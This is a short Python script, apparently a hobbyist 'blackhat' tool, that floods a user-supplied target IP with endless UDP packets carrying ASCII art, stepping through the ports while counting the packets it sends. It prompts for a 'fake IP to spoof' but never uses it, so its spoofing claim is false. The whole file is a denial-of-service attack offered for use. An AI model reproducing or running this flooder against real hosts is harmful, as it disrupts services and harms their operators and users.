import socket

print("\n\n")
print("         +-------------------------------------+")
print("         |     Author: blackhat㉿cerberus       |")
print("         |            Version: 0.1             |")
print("         +-------------------------------------+ ")

print("\n\n")
print("Enter IP Address of The Target ")
target = input("\t == > ")
print("Enter The Fake IP Address that you want to spoof.")
fake_ip = input("\t\t ==> ")
print("Enter The Port Number You Want to Attack ? ")
port = input("\t\t ==> ")

port = int(port)

attack_num = 0

print("Sending Packets...")

def attack(target, port):
    global attack_num  # Declare attack_num as global variable
    cerberus_ascii_art = """
                            /\\_/\\____,
                  ,___/\\_/\\ \\  ~     /
                  \\     ~  \\ )   XXX
                    XXX     /    /\\_/\\___,
                       \\o-o/-o-o/   ~    /
                        ) /     \\    XXX
                       _|    / \\ \\_/
                    ,-/   _  \\_/   \
                   / (   /____,__|  )
                  (  |_ (    )  \\) _|
                 _/ _)   \\   \\__/   (_
                 (,-(,(,(,/      \\,),),)

    """

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            data_packet = cerberus_ascii_art.encode()  # Convert ASCII art to bytes
            sock.sendto(data_packet, (target, port))
            attack_num += 1
            port = (port + 1) % 65535
            print(f"Sent {attack_num} packet to {target} through port: {port}")
    except  Exception as  e:
        print("An error occurred during the attack:", e)

attack(target, port)
